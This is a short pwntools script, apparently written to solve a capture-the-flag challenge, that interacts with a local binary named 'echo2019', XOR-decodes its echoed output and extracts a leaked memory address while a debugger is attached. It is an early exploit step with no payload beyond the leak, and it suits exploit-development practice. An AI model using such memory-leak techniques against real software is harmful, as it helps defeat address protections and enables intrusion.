from pwn import *
p=process('./echo2019')
def uu64(x): return u64(x.ljust(8, b'\0'))
def echo(payload):
    p.recvuntil(b'Input text:')
    p.sendline(payload)
    p.recvuntil(b'Echo:')
    ret= p.recvline().strip()
    result=''
    for i in ret:
        result+=chr(i ^ 0x30)
    print(result)
    return result
gdb.attach(p)
pause()
# rec=echo(b'8dihuui')
# rec=echo(b'0')
rec=echo(b'5'*8)

addr=uu64(rec.encode()[8:])
print(hex(addr))
# addr=int(rec.encode()[11:],16)
# print(rec)
p.interactive()
